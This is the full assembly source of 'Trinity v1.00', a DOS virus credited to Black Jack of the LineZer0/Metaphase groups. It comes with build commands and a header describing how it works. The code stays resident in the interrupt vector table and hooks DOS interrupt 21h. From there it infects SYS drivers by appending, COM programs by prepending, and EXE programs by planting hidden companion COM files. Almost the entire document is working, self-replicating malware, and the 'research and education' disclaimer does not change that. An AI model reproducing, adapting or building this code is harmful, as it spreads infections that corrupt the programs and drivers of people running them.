   ; <-------------------------//LineZer0 Network 99\\------------------------->
   ; =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
   ;
   ;                 Trinity v1.00
   ;
   ;   <----------/\---------------------------------------------/\---------->
   ;
   ;
   ; NAME: Trinity v1.00
   ; AUTHOR: Black Jack /LineZer0 /Metaphase
   ; TYPE: TSR, infects SYS files appending, COM files prepending and EXEs spawning
   ; SIZE: 500 bytes
   ; COMMENTS: This is a very simple virus. I just thought the idea to infect
   ;     three different file types with three completely different methods
   ;     is somehow funny. Also I wanted to try out different ways of
   ;     infection.
   ;     Because spawning EXE infection is highly incompatible with windows,
   ;     I didn't make it ENUNS compatible too, in fact I didn't even test
   ;     it with windows. Also, the residency in the upper half of the
   ;     interrupt vector table may cause problems with some programs. It
   ;     works fine in my MS-DOS 6.22 system, if it makes problems in yours,
   ;     well, I'm sorry, but I don't care too much.
   ;
   ; DESCRIPTION: If an infected program is run or an infected SYS driver is loaded
   ;        from the CONFIG.SYS, the virus installs itself resident into the
   ;        upper half of the interrupt vector table, which is not used in
   ;        most systems, and hooks int 21h. There it monitors the functions
   ;        6C00h (extended open) and 4B00h (execute). Afterwards it returns
   ;        control to the host.
   ;        If a SYS device driver is opened it infects it by appending and
   ;        hooking its strategy routine. If a program with an EXE extension
   ;        is run, it creates a hidden correspondending COM files containing
   ;        the virus code. If a program with an COM extension is run, it
   ;        saves the original program start to the end of the file and
   ;        overwrites the beginning. It won't infect misnamed EXE files.
   ;
   ; DETECTION: It uses no anti-av-techniques (hey, it has quite much
   ;      functionality, if you think that I had to squeese it into 512
   ;      bytes!). Therefore it is detected by most qualtiy scanners.
   ;
   ; ASSEMBLE WITH:
   ;       TASM trinity
   ;       TLINK trinity
   ;       EXE2BIN trinitiy.exe trinity.com
   ;
   ; DISCLAIMER: I do *NOT* support the spreading of virii in the wild. Therefore,
   ;       this source was only written for research and education. Please
   ;       do not spread it. The author and his groups can't be hold
   ;       responsible for what you decide to do with this source.


   ---------------------------[code starts here]--------------------------------

   ; ===== SOME CONSTANTS ======================================================

   virus_length_mem  = ((offset end_virus_mem) - (offset start))
   virus_length_file = ((offset end_virus_file) - (offset start))
   ping_call         = "tr"
   restore_call      = "re"

   ; ===== START OF CODE =======================================================

   .model tiny
   .radix 10
   .286
   .code
   org 0
   start:
       dec bp                          ; "M" - infection marker
       pusha                           ; save registers to stack
       push ds
       push es

       push cs                         ; DS=CS
       pop ds

       call get_delta                  ; get delta offset
   get_delta:
       pop si                          ; si=delta offset
       sub si, offset get_delta

       mov ax, ping_call               ; virus already resident?
       int 21h
       cmp ax, -ping_call
       JE return                       ; if so, don't reinstall to mem

       xor ax, ax                      ; hook int21h
       mov es, ax                      ; ES=segment 0 (IVT)
       xchg ax, es:[21h*4+2]           ; segment of int21h
       mov [si+int21_segm], ax         ; save it
       mov ax, offset new_int21 + 200h ; new offset for int21h
                       ; (virus starts at 0:200 in memory)
       xchg ax, es:[21h*4]             ; offset of int21h
       mov [si+int21_offs], ax         ; save it

       push si                         ; save delta offset
                       ; DS:SI=start of virus in mem
       mov di, 200h                    ; ES:DI=0:200h (upper half of IVT)
       mov cx, di                      ; CX=512
       clc                             ; go upwards with string instructions
       rep movsb                       ; copy 512 bytes

       pop si                          ; restore delta offset

   return:
       db 0EBh                         ; jmp short to correct retrun routine
       distance_return db (return_com - return_base) ; where to jump to

   return_base:

   return_sys:                             ; restore for sys host
       mov ax, [si+org_strategy]       ; restore original strategy routine
       mov word ptr ds:[6], ax

       pop es                          ; restore registers
       pop ds
       popa

       JMP word ptr cs:[6]             ; jump to original strategy routine

   return_com:                             ; return for com host
       pop es                          ; restore registers
       pop ds
       popa

       mov ax, restore_call            ; call memory resident virus part
       db 0BEh                         ; mov si, imm16
       offset_org_start dw offset quit_1st - offset start
       int 21h                         ; our own restore routine

   return_spawn:                           ; return for spawning EXE infection

       mov word ptr ds:[offset segm+100h], cs  ; save CS for parameter block
                       ; of the exec function
                       ; (delta offset in COM is 100h)
       mov sp, offset top_of_stack+100h; set new top of stack

       mov ah, 4Ah                     ; resize MCB
       push cs                         ; ES=CS
       pop es                          ; ES=address of memory block to resize
       mov bx, (offset top_of_stack - offset start + 100h + 15) / 16
       int 21h                         ; bx=new size in paragraphs

       mov es, ds:[2Ch]                ; Get enviroment block in ES
       xor di, di                      ; ES:DI=start enviroment block
       xor ax, ax                      ; al=0 for rep scasb
   get_filename_head:                      ; search our filename in enviroment
       mov cl, -1                      ; length to search
       repne scasb                     ; search for value in al (zero)
       cmp byte ptr es:[di], 0         ; if there's another zero, it's the end
       JNE get_filename_head           ; otherwise compare next variable

       add di, 3                       ; set DI to start of our filename

       push di                         ; save it to stack

       mov al, '.'                     ; search for extension
       repne scasb

       push es                         ; DS=ES
       pop ds

       push cs                         ; ES=CS
       pop es

   .386                                    ; a 32 bit instruction follows
       mov dword ptr [di], "EXE"       ; change .COM to .EXE (our host)
   .286

       mov ax, 4B00h                   ; execute our .EXE host
       mov bx, offset parameter+100h   ; ES:BX=Pointer to parameter-block
       pop dx                          ; DS:DX=Pointer to filename
       int 21h

       mov ah, 4Dh                     ; get return code to AL
       int 21h

       mov ah, 4Ch                     ; quit program with exit code
       int 21h

   parameter:                              ; parameter block
          dw 0                         ; same environment as we
          dw 80h                       ; offset parameter string (in PSP)
   segm       dw 0                         ; segmet parameter string (our CS)
          dw 4 dup(-1)                 ; addresses of FCBs (-1 => standart)

   ; ----- INT 21h HOOK --------------------------------------------------------

   new_int21:
       cmp ax, ping_call               ; residency check?
       JNE no_residency_check
       neg ax                          ; we're already installed!
       iret

   no_residency_check:
       cmp ax, restore_call            ; our own call to restore .COM host?
       JE restore

       pusha                           ; save registers
       push es
       push ds

       cmp ax, 6C00h                   ; extended open?
       JE infect_sys                   ; if so, infect .SYS
       cmp ax, 4B00h                   ; execute?
       JE infect_exec                  ; if so, infect .COM/.EXE

   org_int:                                ; back to original int 21h
       pop ds                          ; restore registers
       pop es
       popa

       db 0EAh                         ; op-code far-jump
   org_int21       EQU this dword
   int21_offs      dw ?
   int21_segm      dw ?


   restore:
       mov di, 100h                    ; move original .COM start back
       add si, di
       clc
       mov cx, virus_length_file
       rep movsb

       mov bx, sp                      ; set new return offset
       mov word ptr ss:[bx], 100h
       iret                            ; jump back to start of host

   ; ----- SYS INFECTION -------------------------------------------------------

   infect_sys:
       mov ax, 3D02h                   ; open file r/w
       mov dx, si                      ; DS:DX=pointer to filename
       int 21h
       JC org_int                      ; if error, then quit
       xchg bx, ax                     ; handle to BX

       push cs                         ; DS=CS
       pop ds

       mov ah, 3Fh                     ; read fileheader
       mov cx, 8                       ; length to read
       mov dx, offset sys_header_buffer + 200h
       int 21h                         ; DS:DX=pointer to buffer

       cmp word ptr ds:[offset sys_header_buffer + 200h], -1
       JNE close_victim                ; real .SYS file?

       mov ax, 4202h                   ; move file pointer to EOF
       xor cx, cx
       cwd                             ; CX:DX=offset new filepointer=0
       int 21h

       mov cx, ax                      ; filelength
       mov dx, ds:[offset victim_strategy + 200h]
       sub cx, virus_length_file
       cmp cx, dx
       JE close_victim                 ; if equal, it's already infected

       mov ds:[offset org_strategy + 200h], dx     ; save original offset
       mov ds:[offset victim_strategy + 200h], ax  ; set new offset

       mov byte ptr ds:[offset distance_return+200h], return_sys-return_base
                       ; set correct return routine

       mov ah, 40h                     ; write virus body
       mov dx, 200h                    ; DS:DX=pointer to writebuffer
       mov cx, virus_length_file       ; length to write
       int 21h

       mov ax, 4200h                   ; move file pointer to BOF
       xor cx, cx
       cwd                             ; CX:DX=offset new filepointer=0
       int 21h

       mov ah, 40h                     ; write new header
       mov cx, 8                       ; length to write
       mov dx, offset sys_header_buffer + 200h
       int 21h                         ; DS:DX=pointer to write buffer

   close_victim:
       mov ah, 3Eh                     ; close file
       int 21h

       JMP org_int

   ; ----- END SYS INFECTION ---------------------------------------------------

   ; ----- SPAWNING EXE INFECTION ----------------------------------------------

   infect_exec:
       push ds                         ; ES=DS
       pop es

       mov al, '.'                     ; search for dot
       mov di, dx                      ; in ES:DI
       mov cl, -1                      ; make sure CX isn't zero
       repne scasb                     ; search for extension in filename

   .386                                    ; we need two 32 bit instructions
       push dword ptr [di]             ; save original extension
       mov dword ptr [di], "MOC"       ; set to .COM extension
   .286

       mov ah, 5Bh                     ; create .COM file
       mov cx, 00000010b               ; file attributes: hidden
       int 21h

   .386
       pop dword ptr [di]              ; restore original extension
   .286

       JC infect_com                   ; if .COM file already exists, infect it
       xchg bx, ax                     ; move handle to BX

       push cs                         ; DS=CS
       pop ds

       mov byte ptr ds:[offset distance_return+200h], return_spawn-return_base

       mov ah, 40h                     ; write virus to file
       mov cx, virus_length_file       ; length to write
       mov dx, 200h                    ; DS:DX=pointer to buffer
       int 21h

       mov ah, 3Eh                     ; close file
       int 21h

   exit_with_error:
       jmp org_int

   ; ----- END SPAWNING EXE INFECTION ------------------------------------------

   ; ----- PREPENDING COM INFECTION --------------------------------------------

   infect_com:
       mov ax, 3D02h                   ; open filer/w
       int 21h
       JC exit_with_error              ; if error, call original int
       push ax                         ; save handle to stack

       mov ah, 48h                     ; get a memory buffer
       mov bx, (virus_length_mem+15)/16; length in paragraphs
       int 21h
       pop bx                          ; restore file handle to BX
       JC close_com                    ; if error, close file & exit
       mov ds, ax                      ; set DS to our buffer

       push ax                         ; and save buffer segment to stack

       mov ah, 3Fh                     ; read from file
       cwd                             ; DS:DX=pointer to buffer (DX=0)
       mov cx, virus_length_file       ; length of virus
       int 21h
       cmp ax, cx                      ; filelength < viruslength ?
       JNE already_infected            ; if so, don't infect

       cmp byte ptr ds:[0], "M"        ; is it already infected or an .EXE ?
       JE already_infected             ; if so, leave it alone

       mov ax, 4202h                   ; move filepointer to EOF
       xor cx, cx                      ; DX:CX=0 (new offset relative to EOF)
       cwd
       int 21h

       mov word ptr cs:[offset_org_start+200h], ax  ; save length of file
                       ; (=offset of original com start)

       mov ah, 40h                     ; write original com start to EOF
       cwd                             ; DS:DX=pointer to buffer
       mov cx, virus_length_file       ; length to write
       int 21h

       mov ax, 4200h                   ; move filepointer to beginning of file
       xor cx, cx                      ; DX:CX=0 (new offset relative to BOF)
       cwd
       int 21h

       push cs                         ; DS=CS
       pop ds

       mov byte ptr ds:[offset distance_return+200h], return_com-return_base
                       ; restore host as COM

       mov ah, 40h                     ; write virus to file
       mov dx, 200h                    ; DS:DX=pointer to buffer
       mov cx, virus_length_file       ; CX=length to write
       int 21h

   already_infected:

       pop es                          ; address of our memory buffer
       mov ah, 49h                     ; leave the buffer alone
       int 21h

   close_com:
       mov ah, 3Eh                     ; close file
       int 21h

       JMP org_int                     ; go to original handler

   ; ----- END PREPENDING COM INFECTION ----------------------------------------

   ; ----- DATA ----------------------------------------------------------------

   org_strategy            dw 0

   copyright               db "[Trinity by Black Jack]"

   end_virus_file:

   sys_header_buffer:
   victim_id               dd 0                    ; SYS file id (-1)
   victim_attrib           dw 0                    ; attributes
   victim_strategy         dw 0                    ; offset strategy-routine

   end_virus_mem:

   quit_1st:
       int 20h

   dw 100h-2 dup(?)                                ; stack place
   EVEN                                            ; we don't want an odd stack!
   top_of_stack:

   end start
